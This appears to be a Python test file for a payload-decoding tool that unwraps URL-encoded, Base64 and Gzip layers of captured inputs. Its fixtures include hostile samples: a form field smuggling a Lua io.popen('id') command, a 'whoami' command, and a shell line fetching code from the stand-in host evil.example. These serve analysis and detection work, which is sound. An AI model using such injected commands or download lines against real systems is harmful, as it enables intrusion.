"""Слои декодирования payload'а: URL, Base64, Gzip/Deflate."""
import base64
import gzip

from paradox_gui.payload_decode import build_variants


def test_raw_only_when_nothing_to_decode():
    variants = build_variants(b"plain text, no wrapping")

    assert len(variants) == 1
    assert variants[0].steps == ()
    assert variants[0].is_raw()


def test_url_decode_variant():
    variants = build_variants(
        b'username=a%00b%0dlocal+h+%3d+io.popen("id")'
    )

    assert [v.steps for v in variants] == [(), ("url",)]
    assert b"local h = io.popen" in variants[-1].data
    assert b"\x00" in variants[-1].data


def test_base64_variant():
    payload = b"<?php echo 'hello'; ?>"
    encoded = base64.b64encode(payload)

    variants = build_variants(encoded)

    assert [v.steps for v in variants] == [(), ("base64",)]
    assert variants[-1].data == payload


def test_gzip_variant():
    payload = b'{"cmd": "whoami", "note": "x" * 40}'
    packed = gzip.compress(payload)

    variants = build_variants(packed)

    assert [v.steps for v in variants] == [(), ("gzip",)]
    assert variants[-1].data == payload


def test_base64_then_gzip_chain():
    payload = b"#!/bin/sh\nwget http://evil.example/x\n" * 4
    packed = gzip.compress(payload)
    encoded = base64.b64encode(packed)

    variants = build_variants(encoded)

    assert [v.steps for v in variants] == [(), ("base64",), ("base64", "gzip")]
    assert variants[-1].data == payload


def test_binary_base64_is_not_added():
    """Случайный бинарь в base64 не должен становиться вариантом."""
    encoded = base64.b64encode(bytes(range(32)))

    variants = build_variants(encoded)

    assert [v.steps for v in variants] == [()]


def test_each_step_applies_once():
    variants = build_variants(b"a%2541b")

    steps = [step for v in variants for step in v.steps]
    assert steps.count("url") <= 2
    assert len(variants) <= 5
